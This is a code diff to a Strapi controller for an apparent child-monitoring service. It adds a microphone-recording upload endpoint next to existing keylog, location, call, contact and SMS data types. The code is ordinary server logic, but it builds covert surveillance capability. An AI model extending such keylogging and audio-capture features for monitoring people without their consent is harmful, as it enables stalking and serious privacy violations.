@@ -6,13 +6,14 @@ const { generateCode, sendSMS} = require('../../../utils/otp')
 const { customSuccess, customError } = require("../../../utils/app-response");
 const md5 = require("md5");
 const isArray = require("lodash/isArray");
+const {uploadFile} = require("../../../utils/upload");
 /**
  * child controller
  */
 
 const { createCoreController } = require('@strapi/strapi').factories;
 module.exports = createCoreController('api::child.child', ({ strapi}) => ({
-    entityTypes: { 'app-usage': true, 'call': true, 'contact': true, 'keylog': true, 'location': true, 'sm': true },
+    entityTypes: { 'app-usage': true, 'call': true, 'contact': true, 'keylog': true, 'location': true, 'sm': true, 'microphone': true },
     async registerChildV2(phone, name, age) {
       const phoneWoP = phoneNumberWithoutPlus(phone)
       try {
@@ -259,6 +260,11 @@ module.exports = createCoreController('api::child.child', ({ strapi}) => ({
       try {
         const { data } = ctx.request.body
         const { user } = ctx.state
+
+        if (entityTypeName === 'microphone') {
+          const [ child ] = await strapi.entityService.findMany('api::child.child', { filters: { user: user.id } });
+          return await this.createMicrophoneEntity(ctx, child)
+        }
         if (!isArray(data)) return customError(ctx, 'data is required and must be array')
         if (!data.length) return customError(ctx, 'data is empty')
 
@@ -277,6 +283,28 @@ module.exports = createCoreController('api::child.child', ({ strapi}) => ({
         return await customSuccess(ctx, null)
       } catch (err) {
         strapi.log.error(`error in function createEntityManyV2 while creating ${entityTypeName} entity, error: `, err)
+        return await customError(ctx, 'internal server error', 500)
+      }
+    },
+    async createMicrophoneEntity(ctx, child) {
+      try {
+        const { file } = ctx.request.files
+        const body = ctx.request.body
+        const [ isFileUploaded , path ] = await uploadFile(file, 'microphones', child.id)
+        if (!isFileUploaded) {
+          return await customError(ctx, 'error while uploading microphone', 500);
+        }
+        const entityData = {
+          ...body,
+          child: child.id,
+          path: path
+        }
+        await strapi.entityService.create('api::microphone.microphone', {
+          data: entityData
+        });
+        return await customSuccess(ctx, null)
+      } catch (err) {
+        strapi.log.error(`error in function createMicrophoneEntity, error: `, err)
         return await customError(ctx, 'internal server error', 500)
       }
     },
